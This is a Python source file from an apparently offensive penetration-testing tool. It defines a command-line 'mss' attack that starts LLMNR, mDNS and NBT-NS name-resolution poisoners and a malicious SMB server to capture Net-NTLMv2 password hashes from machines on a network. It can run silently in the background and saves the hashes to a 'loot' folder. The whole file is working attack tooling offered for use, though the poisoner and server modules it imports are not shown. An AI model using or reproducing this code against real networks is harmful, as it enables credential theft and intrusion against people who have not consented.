#!/usr/bin/env python3
#
from multiprocessing import Process, Manager
import sys
import os
import signal

import argparse
from log_symbols import LogSymbols
from threading import Thread
from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, Cmd2ArgumentParser, with_argparser

from .servers import MaliciousSmbServer
from .poison import PoisonLauncher


@with_default_category("Man in the middle attacks")
class SmbServerAttack(CommandSet):
    """[ Class containing smbrelay attack ]"""

    def __init__(self) -> None:
        super().__init__()
        self.__poison_launcher = None
        self.__smbserver = None
        self.__attack = None
        self.__alerts_dictionary = Manager().dict()
        self.__ntlmv2_collected = Manager().dict()
        self.__define_alerts()
        self.__alerts_hunter = None
        self.__path_file = os.getcwd()

    def __configure_alerts_thread(self):
        """[ Method to configure the thread that shows alerts ]"""
        self.__alerts_hunter = Thread(target=self.__display_ntlmv2)
        self.__alerts_hunter.dameon = True
        self.__alerts_hunter.start()

    def __check_directory(self) -> bool:
        """[ Method to check if a directory exists ]"""
        return os.path.isdir(self.__path_file) and os.access(
            self.__path_file, os.X_OK | os.W_OK
        )  # Executing and wirte

    def __define_alerts(self):
        """[ Method to define the dictionary that triggers the alerts ]"""
        self.__alerts_dictionary["new_ntlmv2"] = 0
        self.__alerts_dictionary["stop"] = 0

    def __ends_process_in_the_background(self):
        """[ Method to stop the attack by the user ]"""
        if self.__attack is not None and self.__attack.is_alive:
            self._cmd.info_logger.success("Finishing mss attack in the background ...")
            self.__attack.terminate()
            self.__attack.join()
            self.__attack = None
            if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
                self.__alerts_dictionary["stop"] = 1
                self.__alerts_hunter.join()
                self.__alerts_dictionary["stop"] = 0
        else:
            self._cmd.error_logger.error("There is not mss process in the background")

    def __async_options(self):
        """[ Configuration in case of an asynchronous attack ]"""
        sys.stdout = open("/dev/null", "w")
        signal.signal(signal.SIGINT, signal.SIG_IGN)

    def __display_ntlmv2(self):
        """[ Method to show an alert in case of finding a new hash ]"""
        while self.__alerts_dictionary["stop"] == 0:
            if self.__alerts_dictionary["new_ntlmv2"] == 1:
                if self._cmd.terminal_lock.acquire(blocking=False):
                    self._cmd.async_alert(
                        f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered. Saved in {self.__path_file}"
                    )
                    self._cmd.terminal_lock.release()
                self.__alerts_dictionary["new_ntlmv2"] = 0

    def __components_to_launch(self):
        """[ Method to launch the poisoner and malicious smb server ]"""
        self.__poison_launcher.start_poisoners()
        self.__smbserver.start_malicious_smbserver()

    def __launch_necessary_components(self, args: argparse.Namespace) -> None:
        """[ Method to launch the components necessary for the attack ]"""
        if args.Asynchronous:
            self.__async_options()
        self.__components_to_launch()

    def __synchronous_attack(self):
        """[ Method to launch the synchronous attack ]"""
        try:
            # If ctrl+c then the process terminate and smb_relay exits
            self.__attack.join()
        except KeyboardInterrupt:
            self.__attack.terminate()
            self.__attack.join()
            self.__attack = None
            self._cmd.error_logger.warning("Exiting smb relay attack ...")

    def __launching_attack(self, args: argparse.Namespace) -> None:
        """[ Method to launch the attack ]
        Args:
            args (argparse.Namespace): [ Arguments passed to the attack ]
        """
        self.__attack = Process(target=self.__launch_necessary_components, args=(args,))
        self.__attack.start()
        self._cmd.info_logger.info(
            f"Running mss the results will be saved in : {self.__path_file}"
        )

        if not args.Asynchronous:
            self.__synchronous_attack()

    def __poison_configuration(self, args: argparse.Namespace) -> dict:

        poison_selector = {"MDNS": 0, "NBT_NS": 0, "LLMNR": 0}
        if args.mdns:
            poison_selector["MDNS"] = 1
        if args.nbt_ns:
            poison_selector["NBT_NS"] = 1
        if args.llmnr:
            poison_selector["LLMNR"] = 1
        return poison_selector

    def __creating_components(self, args: argparse.Namespace) -> None:
        """[ Method to create the necessary classes ]
        Args:
            args (argparse.Namespace): [ Arguments passed to the attack ]

        """
        poison_selector = self.__poison_configuration(args)
        self.__poison_launcher = PoisonLauncher(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
            self._cmd.info_logger,
            args.Asynchronous,
            poison_selector,
        )

        self.__smbserver = MaliciousSmbServer(
            self._cmd.LHOST,
            self._cmd.LPORT,
            self._cmd.info_logger,
            self.__ntlmv2_collected,
            args.Asynchronous,
            self.__path_file,
            self.__alerts_dictionary,
        )

    def __checking_conditions_for_attack(self, args: argparse.Namespace) -> bool:
        """[ Method to check attack options ]

        Args:
             args (argparse.Namespace): [ Arguments passed to the attack ]
        """
        if args.end_attack:
            self.__ends_process_in_the_background()
            return
        if self.__attack is not None:
            self._cmd.error_logger.warning(
                "The attack is already running in the background"
            )
            return False
        if args.output_ntlmv2 != ".":
            self.__path_file = args.output_ntlmv2

        if not self.__check_directory():
            self._cmd.error_logger.warning("Error with output file")
            return False

        if args.Asynchronous:
            self.__configure_alerts_thread()

        return True

    argParser = Cmd2ArgumentParser(
        description="""Malicious smb server attack to get hashes net-NTLMV """
    )

    display_options = argParser.add_argument_group(
        " Arguments for displaying information "
    )
    display_options.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    run_options = argParser.add_argument_group(" Arguments for ways to run a program ")
    run_options.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background. The results will be saved in log/hashes_ntlm",
    )

    attack_options = argParser.add_argument_group(" Options to modify attack behavior")
    attack_options.add_argument(
        "-E",
        "--end_attack",
        action="store_true",
        help="End the attack in the background process",
    )
    attack_options.add_argument(
        "-ON",
        "--output_ntlmv2",
        action="store",
        default="/home/rsgbengi/Igris/loot",
        help="Output of the hashes ntlmv2",
    )
    attack_options.add_argument(
        "-L",
        "--llmnr",
        action="store_true",
        help="To use llmnr poisoning",
    )
    attack_options.add_argument(
        "-M",
        "--mdns",
        action="store_true",
        help="To use MDNS poisoning",
    )
    attack_options.add_argument(
        "-N",
        "--nbt_ns",
        action="store_true",
        help="To use NBT_NS poisoning",
    )
    @with_argparser(argParser)
    def do_mss(self, args: argparse.Namespace) -> None:
        """[ Command to create a malicious smb server to get ntlm hashes ]

        Args:
            args (argparse.Namespace): [Arguments passed to the smb_relay command]

        """
        self._cmd.info_logger.debug(
            f"""Starting malicious smb server attack using ip: {self._cmd.LHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )
        if not (self.__checking_conditions_for_attack(args)):
            return

        self.__creating_components(args)

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):
            self.__launching_attack(args)

    def mss_postloop(self) -> None:
        """[method to stop the attack before the application is terminated]"""
        if self.__attack is not None and self.__attack.is_alive:
            self.__attack.terminate()
            self.__attack.join()
            if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
                self.__alerts_dictionary["stop"] = 1
                self.__alerts_hunter.join()
